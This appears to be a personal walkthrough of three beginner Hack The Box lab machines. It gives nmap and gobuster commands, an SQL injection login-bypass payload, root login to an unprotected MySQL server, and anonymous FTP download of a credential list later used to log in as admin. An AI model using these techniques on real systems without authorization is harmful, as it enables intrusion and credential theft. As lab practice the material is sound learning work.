# Starting Point - TIER I
In this section i would be tackling the tier 1 machines for the starting point section.
```
Bound to succeed
```
## Machines - Tier 1
### Appointment 
- Difficulty: Very Easy 
- Performed the nmap scan 
```
nmap -sV -sC -Pn 10.129.65.124
```
- HTTP service found running on port 80
- Login page found by browsing to the webpage http:\\10.129.65.124
- Using Gobuster to conduct more enumeration regarding the website
```
gobuster dir --url http:\\10.129.65.124 --wordlist //filepathtothewordlist
```
- I ran OWASP-ZAP to gather more information 
- Found out the webpage is vulnerable to SQL Injection 
- " Admin'# " was given the username and password can be anything
- Anything that omes after # is considered as a comment , therefore we could put anything for the password and bypass the login 
- Flag can be found in the page after logging into the admin user.

### Sequal 
- Difficulty: Very east 
- Performed the usual nmap scan 
```
nmap -sV -sC -Pn 10.129.204.129
```
- SQL service found running on porg 3306
- MariaDB is the sql database being used here
- Next step is to connect the mysql server using the following command 
```
Mysql -h 10.129.204.129 -u root -p
```
- After logging into database run the following commands
```
show database;
use htb;
show tables;
select * from config;

```
- The commands above would show us the different database and then we can choose the database and view the tables with content inside them
- The flag was found in the table config 

### Crocodile 
- Difficulty: Very easy 
- Performed the NMAP scan 
```
nmap -sV -sC -Pn 10.129.1.15
```
- FTP services was found running on the port 21 and there was a http server running on port 80
- Next step is to connect to the ftp server and login as anonymous 
```
ftp 10.128.1.15
```
- View the folders and files inside the file server

```
dir
```
- Userlist with password was found . Now i will download the userlist to my machine by running the following command

```
Get allowed.userlist
```
- Now we need to find a portal to use the stolen credentials. As we already know there is a http server running on port 80. Lets conduct more recon on this website
- Using Gobuster lets conduct more enumeration on the website
```
gobuster -dir -u 10.129.1.15 -w wordlist.txt -x php
```
- Login page found "login.php"
- Using the credentials from the ftp server , log in as Admin user.
- Flag found after loggin in as admin user
